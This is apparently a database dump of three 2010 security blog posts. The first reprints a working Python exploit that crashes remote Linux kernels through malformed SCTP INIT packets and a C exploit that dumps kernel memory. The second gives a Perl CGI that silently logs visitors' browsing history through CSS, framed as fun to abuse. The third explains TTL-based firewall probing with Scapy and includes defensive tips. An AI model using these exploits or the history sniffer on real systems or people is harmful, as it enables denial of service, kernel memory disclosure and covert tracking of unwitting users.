'223','1','open','http://www.attackvector.org/?p=223','0','open','','2','I was going through my RSS updates and noticed this:  <a href=\"http://www.securityfocus.com/bid/39794\">http://www.securityfocus.com/bid/39794</a>.  Not good.  Any time that there\'s a remote DoS against a Linux box, it means bad things.\n\nI started digging, because I\'m not terribly familiar with SCTP.  First, I wanted to know more about the vulnerability itself.  I found this: <a href=\"http://permalink.gmane.org/gmane.comp.security.oss.general/2859\">http://permalink.gmane.org/gmane.comp.security.oss.general/2859</a>.  Simply put, the vulnerability stems from someone coding something that allows user input, but doesn\'t do the proper sanity checks.  Seriously, it\'s unbelievable that this type of vulnerability still exists.\n\nAnyway, I also discovered that SCTP is shipped with the most recent Ubuntu releases by default, so.. this is a significant attack vector.\n\nThe easiest way to begin testing is to bring up an SCTP server on a separate machine.  Do this by:\n<!--more-->\n<blockquote>\nsctp_darn -H 0 -P <whatever port> -l\n</blockquote>\n\nTada, you now have an SCTP server.\n\nSecond, you\'re going to need the development release of Scapy, because SCTP support hasn\'t officially been added yet.  Follow the instructions <a href=\"http://www.secdev.org/projects/scapy/doc/installation.html\">here</a> to update to 2.1.1-dev.\n\nOnce everything is squared away, its important to get a better understanding of the protocol itself.  <a href=\"http://www.networksorcery.com/enp/protocol/sctp.htm\">This</a> is a great overview of the protocol.\n\nSo, now we have a SCTP server running, Scapy is on the bleeding edge, we\'re better edumacated on SCTP, and we know that the vulnerability happens when too many malformed chunks are supplied during the init process.\n\nTime to play!\n\nUnfortunately, I don\'t have a kerenl that appears to be vulnerable to this (tested.. also not listed on the list of vulnerable kernels), so I\'m not ENTIRELY sure that this actually works... but.\n\nBecause the advisory indicates that the overflow is triggered by too many of it\'s variable length parameters being malformed, theoretically this should do the trick:\n\n<blockquote>\nsend(IP(dst=\"10.0.0.1\")/SCTP(sport=2600,dport=2500)/SCTPChunkInit(type=1)\n/fuzz(SCTPChunkParamAdaptationLayer())/fuzz(SCTPChunkParamCookiePreservative())\n/fuzz(SCTPChunkParamFwdTSN())/fuzz(SCTPChunkParamIPv4Addr())\n/fuzz(SCTPChunkParamUnrocognizedParam())/fuzz(SCTPChunkParamECNCapable())\n/fuzz(SCTPChunkParamHearbeatInfo())/fuzz(SCTPChunkParamHostname())\n/fuzz(SCTPChunkParamStateCookie()), loop=1)\n</blockquote>\n\nI suggest playing with this further if you have access to a kernel that is listed as being vulnerable.  When I get home tonight I\'m going to check my other boxes to see if one of them has an older kernel.  If I come up with anything, I\'ll let you know.  Please do the same!  :-)\n\nUPDATE:\n\nI just came across a exploit for this written in both Python and C.\n\n<pre lang=\"python\">\n# From: http://jon.oberheide.org/files/sctp-boom.py\n#!/usr/bin/env python\n \n\'\'\'\n  sctp-boom.py\n  \n  Linux Kernel <= 2.6.33.3 SCTP INIT Remote DoS\n  Jon Oberheide <jon@oberheide.org>\n  http://jon.oberheide.org\n   \n  Information:\n  \n    http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-1173\n \n    The sctp_process_unk_param function in net/sctp/sm_make_chunk.c in the\n    Linux kernel 2.6.33.3 and earlier, when SCTP is enabled, allows remote\n    attackers to cause a denial of service (system crash) via an SCTPChunkInit\n    packet containing multiple invalid parameters that require a large amount\n    of error data.\n \n  Usage:\n  \n    $ python sctp-boom.py 1.2.3.4 19000\n    [+] sending malformed SCTP INIT msg to 1.2.3.4:19000\n    ...\n    [+] kernel should have panicked on remote host 1.2.3.4\n \n  Requirements:\n     \n    * dnet: http://libdnet.sourceforge.net/\n    * dpkt: http://code.google.com/p/dpkt/\n \n\'\'\'\n \nimport os, sys, socket\n \ndef err(txt):\n    print \'[-] error: %s\' % txt\n    sys.exit(1)\n \ndef msg(txt):\n    print \'[+] %s\' % txt\n \ndef usage():\n    print >> sys.stderr, \'usage: %s host port\' % sys.argv[0]\n    sys.exit(1)\n \ntry:\n    import dpkt\nexcept ImportError:\n    err(\'requires dpkt library: http://code.google.com/p/dpkt/\')\n \ntry:\n    import dnet\nexcept ImportError:\n    try:\n        import dumbnet as dnet\n    except ImportError:\n        err(\'requires dnet library: http://libdnet.sourceforge.net/\')\n \ndef main():\n    if len(sys.argv) != 3:\n        usage()\n \n    host = sys.argv[1]\n    port = int(sys.argv[2])\n \n    try:\n        sock = dnet.ip()\n        intf = dnet.intf()\n    except OSError:\n        err(\'requires root privileges for raw socket access\')\n \n    dst_addr = socket.gethostbyname(host)\n    interface = intf.get_dst(dnet.addr(dst_addr))\n    src_addr = interface[\'addr\'].ip\n \n    msg(\'sending malformed SCTP INIT msg to %s:%s\' % (dst_addr, port))\n \n    invalid = \'\'\n    invalid += \'x20x10x11x73\'\n    invalid += \'x00x00xf4x00\'\n    invalid += \'x00x05\'\n    invalid += \'x00x05\'\n    invalid += \'x20x10x11x73\'\n \n    for i in xrange(20):\n        invalid += \'xc0xffx00x08xffxffxffxff\'\n \n    init = dpkt.sctp.Chunk()\n    init.type = dpkt.sctp.INIT\n    init.data = invalid\n    init.len = len(init)\n \n    sctp = dpkt.sctp.SCTP()\n    sctp.sport = 0x1173\n    sctp.dport = port\n    sctp.data = [ init ]\n \n    ip = dpkt.ip.IP()\n    ip.src = src_addr\n    ip.dst = dnet.ip_aton(dst_addr)\n    ip.p = dpkt.ip.IP_PROTO_SCTP\n    ip.data = sctp\n    ip.len = len(ip)\n \n    print `ip`\n \n    pkt = dnet.ip_checksum(str(ip))\n    sock.send(pkt)\n \n    msg(\'kernel should have panicked on remote host %s\' % (dst_addr))\n \nif __name__ == \'__main__\':\n    main()\n</pre>\n\n<pre lang=\"c\">\n/*\n * cve-2008-4113.c\n *\n * Linux Kernel < 2.6.26.4 SCTP kernel memory disclosure\n * Jon Oberheide <jon@oberheide.org>\n * [url=\"http://jon.oberheide.org\"]http://jon.oberheide.org[/url]\n * \n * Information:\n *\n *   [url=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4113\"]http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4113[/url]\n *\n *   The sctp_getsockopt_hmac_ident function in net/sctp/socket.c in the Stream\n *   Control Transmission Protocol (sctp) implementation in the Linux kernel \n *   before 2.6.26.4, when the SCTP-AUTH extension is enabled, relies on an \n *   untrusted length value to limit copying of data from kernel memory, which \n *   allows local users to obtain sensitive information via a crafted \n *   SCTP_HMAC_IDENT IOCTL request involving the sctp_getsockopt function.\n *\n * Notes:\n *\n *   If SCTP AUTH is enabled (net.sctp.auth_enable = 1), this exploit allow an \n *   unprivileged user to dump an arbitrary amount (DUMP_SIZE) of kernel memory\n *   out to a file (DUMP_FILE). If SCTP AUTH is not enabled, the exploit will \n *   trigger a kernel OOPS.\n */\n\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <errno.h>\n#include <sys/socket.h>\n#include <netinet/in.h>\n#include <netinet/sctp.h>\n\n#ifndef SCTP_HMAC_IDENT\n#define SCTP_HMAC_IDENT 22\n#endif\n\n#define DUMP_SIZE 256*1024\n#define DUMP_FILE \"mem.dump\"\n\nint\nmain(int argc, char **argv)\n{\n        int ret, sock;\n        FILE *dumpfile;\n        char *memdump, *err;\n        socklen_t memlen = DUMP_SIZE;\n\n        memdump = malloc(DUMP_SIZE);\n        if (!memdump) {\n                err = \"malloc(3) failed\";\n                printf(\"[-] Error: %s (%s)n\", err, strerror(errno));\n                return 1;\n        }\n        memset(memdump, 0, DUMP_SIZE);\n\n        printf(\"[+] creating IPPROTO_SCTP socketn\");\n\n        sock = socket(PF_INET, SOCK_STREAM, IPPROTO_SCTP);\n        if (sock == -1) {\n                err = \"socket(2) failed\";\n                printf(\"[-] Error: %s (%s)n\", err, strerror(errno));\n                return 1;\n        }\n\n        printf(\"[+] getting socket option SCTP_HMAC_IDENT with length of %dn\", memlen);\n\n        ret = getsockopt(sock, SOL_SCTP, SCTP_HMAC_IDENT, memdump, &memlen);\n        if (ret == -1) {\n                err = \"getsockopt(2) failed\";\n                printf(\"[-] Error: %s (%s)n\", err, strerror(errno));\n                return 1;\n        }\n\n        printf(\"[+] dumping %d bytes of kernel memory to %sn\", memlen, DUMP_FILE);\n\n        dumpfile = fopen(DUMP_FILE, \"wb\");\n        if (!dumpfile) {\n                err = \"fopen(3) failed\";\n                printf(\"[-] Error: %s (%s)n\", err, strerror(errno));\n                return 1;\n        }\n        fwrite(memdump, 1, memlen, dumpfile);\n        fclose(dumpfile);\n        \n        printf(\"[+] done.n\");\n\n        return 0;\n}\n</pre>\n','','2010-05-18 12:27:27','2010-05-18 17:27:27','','','2010-05-18 12:27:27','2010-05-18 17:27:27','linux-vulnerability-sctp_process_unk_param-scapy','0','','publish','UPDATED: Linux Vulnerability: sctp_process_unk_param & Scapy','post',''),(
'238','1','open','http://www.attackvector.org/?p=238','0','open','','2','If you read the title of this post and immediately wanted to correct my terrible English, you obviously are not oldschool and have never seen this video:\n<!--more-->\n<object width=\"480\" height=\"385\"><param name=\"movie\" value=\"http://www.youtube.com/v/qItugh-fFgg&hl=en_US&fs=1&\"></param><param name=\"allowFullScreen\" value=\"true\"></param><param name=\"allowscriptaccess\" value=\"always\"></param><embed src=\"http://www.youtube.com/v/qItugh-fFgg&hl=en_US&fs=1&\" type=\"application/x-shockwave-flash\" allowscriptaccess=\"always\" allowfullscreen=\"true\" width=\"480\" height=\"385\"></embed></object>\n\nAnyway, to the real topic.  I came across this neat trick that involves enumerating browser history using simple CSS.  I had never seen the CSS version, but was very familiar with the one written in JavaScript.\n\nSome of you have probably seen this, others are probably going to pee themselves a little.  How this works is really simple.\n\nWhen you visit a link, your browser will display the link following the properties of a \"a:visited\" CSS tag.  If, within this tag, you were to write something like, say, \"background: url(log.php?website.com)\", you could log the fact that your visitor had been to \"website.com\" prior to visiting your site, because his browser chose to display the link using the \"a:visited\" tag.  (Basically, the site was in your visitors history).\n\nNow, if you were to have a <a href=\"http://s3.amazonaws.com/alexa-static/top-1m.csv.zip\">huge list</a> (note - that contains 1,000,000 websites), you could probably enumerate a pretty good chunk of your visitors history, if not all of it.\n\nYou can try my <a href=\"http://www.attackvector.org/cgi/sniff.cgi\">demo here</a>.  This was originally written by RSnake at <a href=\"http://ha.ckers.org\">ha.ckers.org</a>.  I\'ve taken it and heavily modified it and rewrote most of it to suite my purposes.\n\nThere are a number of ways to use this information.  If you\'re in advertising/marketing, this information would be incredibly useful in determining who your competitors are, what prices you need to beat, etc.  In fact, you could have your page dynamically adjust your prices if you happen to know your competitors prices.\n\nMore maliciously, this could be used for blackmail, extortion, stealing cookies, building profiles of people, figuring out where certain people have accounts, all sorts of other mischief.  \n\nBecause this doesn\'t use JavaScript, the Firefox plugin \"NoScript\" wont help you much.  The best thing you can do, afaik, is make sure that your browser clears its cache and history every time you close it.  \n\nAlso, in my demo, I didn\'t HAVE to display anything.. I could have easily just kept it quiet and embedded it into a page, silently sniffing everyones history.  But, what fun would that be?\n\nIf I come up with any other fun ways to abuse this, I\'ll update this post.  :-)\n\nAnyway, here\'s the code.\n\n<pre lang=\"perl\">\n#!/usr/bin/perl\n$log = \"cgi/log.txt\";\n\nopen(SITES, \"cgi/sites5.txt\") || die \"$!\";\nchomp(@sites = <SITES>);\nclose(SITES);\n\n@chars = (\'a\'..\'z\',\'A\'..\'Z\');\nfor($i = 0; $i < 10; $i++) {\n  $cookie .= $chars[rand @chars];\n}\n\n$string = join(\".\", $ENV{REMOTE_ADDR}, $cookie);\n\nif ($ENV{QUERY_STRING}) {\n  print \"Content-type: text/plainnn\";\n  if ($ENV{QUERY_STRING} =~ m/^(d+.*?)-(d*)/) {\n    open (FILE, \">>$log\") || die \"$!\";\n    print FILE \"$1 - $sites[$2]n\";\n  } else {\n    open (FILE, \"$log\") || die \"$!\";\n    print \"You\'ve visited the following sites:n\";\n    $i = 1;\n    foreach $line (<FILE>) {\n      if ($line =~ m/$ENV{QUERY_STRING} - (.*)/) {\n        print \"t$i) $1n\" unless ($urls{$1});\n        $i++;\n        $urls{$1} = 1;\n      }\n    }\n  }\n  close FILE;\n} else {\n  print \"Content-type: text/htmlnn\";\n  print<<HEADER;\n<html>\n  <body>\n    <style>\n      #menu {\n        background:#ccc;\n      }\n      #menu a, #menu a:visited {\n        color:#000; \n      }\nHEADER\n  \n  for ($i = 0; $i <= $#sites; $i++) {\n    print<<CSS;\n      #menu a:visited span.span$i {\n      background: url(cgi/sniff.cgi?$string-$i);\n    }\nCSS\n  }\n  print<<HTML;\n      #menu a span {\n        display:none;\n      }\n      #menu a:hover {\n        color:#f00;  \n      }\n      .box {\n        position:relative;\n      }\n      p.text {\n        padding-left: 50px;\n        padding-right: 50px;\n      }\n    </style>\n    <div align=\"center\">\n      <div id=\"menu\" align=\"left\">\nHTML\n\n  for ($i = 0; $i <= $#sites; $i++) {\n    print<<URL;\n        <div class=\"box\">\n          <a href=\"$sites[$i]\">\n            <span class=\"span$i\"></span>\n          </a>\n        </div>\nURL\n  }  \n  print<<FOOTER;\n      </div>\n      <meta http-equiv=\"REFRESH\" content=\"0;url=cgi/sniff.cgi?$string\">\n    </div>\n  </body>\n</html>\nFOOTER\n}\n</pre>\n\n','','2010-05-20 18:53:33','2010-05-20 23:53:33','','','2010-05-20 18:53:33','2010-05-20 23:53:33','all-your-history-are-belong-to-us','0','','publish','All your history are belong to us.','post',''),(
'253','2','open','http://www.attackvector.org/?p=253','0','open','','2','I was asked.. \"How would you find out if a firewall is forwarding a port to an internal machine or not?\"  I pondered for a minute, having read a lot about this but never really having much of a use for it.. but the answer is.. TTL.\n\nTTL, or \"time to live\", determines how long a packet will, well, \"live\" (basically - how many machines it will hit before it stops being routed).\n\nEssentially, a firewall inspects packet headers and compares it to its policies.  The policies will either be to drop, reject, accept, or forward the packet.  To understand what a firewall is doing with a packet, you have to understand the 3 way handshake of TCP:\n<!--more-->\n<center><img src=\"http://www.ids-sax2.com/articles/images/syn-flood.jpg\"></center>\n\nSo, the client sends a packet with the SYN bit set to a specific port.  The server returns a \"SYN+ACK\", acknowledging the packet, if the port is open.  The client returns with an ACK, establishing the connection.  If the port is closed, rather than a SYN+ACK being returned from the server, the server will respond with RST+ACK, indicating to the client that the port is closed.\n\nA firewall, in the simplest of terms, polices this process.  Depending on the configuration, a firewall will either reject (sending the RST+ACK) or drop (sending nothing at all) the packet based on its policies.\n\nAnyway, the question at hand was, how would you determine the behavior of the firewall on given ports?\n\nScapy, once again, makes this super, super simple.\n\n<blockquote>\n>>> traceroute(\"1.2.3.4\", dport=80, maxttl=20)\nBegin emission:\n***Finished to send 20 packets.\n****\nReceived 7 packets, got 7 answers, remaining 13 packets\n   1.2.3.4:tcp80 \n14 1.2.3.4  RA   \n15 1.2.3.4  RA   \n</blockquote>\n\nOk, so hop 13 is the firewall/router/whatever.  I know this because using this same technique against other ports yields the same amount of hops... until I hit an open port.\n\n<blockquote>\n>>> traceroute(\"1.2.3.4\", dport=40000, maxttl=20)\nBegin emission:\n***Finished to send 20 packets.\n***\nReceived 6 packets, got 6 answers, remaining 14 packets\n   1.2.3.4:tcp40000 \n15 1.2.3.4  SA      \n16 1.2.3.4  SA\n</blockquote>      \n\nThis time we receive a SYN+ACK, rather than an RST+ACK, indicating that the port is open.. and the last hop is 14.  One beyond the router, which our previous traceroute indicated was at 13.  We can then deduce that port 40000 is being forwarded from the router/firewall to a machine on the lan.\n\nAnother way to verify this is to increment the TTL by 1 and..\n\n<blockquote>\n>>> ans,unans=sr(IP(dst=\"1.2.3.4\", ttl=14)/TCP(dport=40000))\nBegin emission:\n.Finished to send 1 packets.\n..^C\nReceived 3 packets, got 0 answers, remaining 1 packets\n</blockquote>\n\nNo answer, because the packet expired at the router, before it was forwarded.  Increment the TTL again, however..\n\n<blockquote>\n>>> ans,unans=sr(IP(dst=\"1.2.3.4\", ttl=15)/TCP(dport=40000))\nBegin emission:\nFinished to send 1 packets.\n*\nReceived 1 packets, got 1 answers, remaining 0 packets\n>>> ans.show(Raw)\n0000 (<IP  frag=0 ttl=15 proto=tcp dst=1.2.3.4 |<TCP  dport=40000 |>>, <IP  version=4L ihl=5L tos=0x20 len=44 id=24359 flags= frag=0L ttl=114 proto=tcp chksum=0x5828 src=1.2.3.4 dst=192.168.1.100 options=[] |<TCP  sport=40000 dport=ftp_data seq=146142610 ack=1 dataofs=6L reserved=0L flags=SA window=65535 chksum=0x6c4a urgptr=0 options=[(\'MSS\', 1414)] |>>)\n</blockquote>\n\nPretty simple.. but very easy to block.  Make sure your firewall drops packets, not rejects.. make sure that all policies on the firewall use connection tracking and verify that a packet was originally sent from the inside before being accepted from the outside (in iptables, this is \'established\' and \'related\'.. go read).','','2010-05-21 21:48:45','2010-05-22 02:48:45','','','2010-05-21 21:48:45','2010-05-22 02:48:45','firewall-fun-with-scapy','0','','publish','Firewall fun with Scapy','post','');
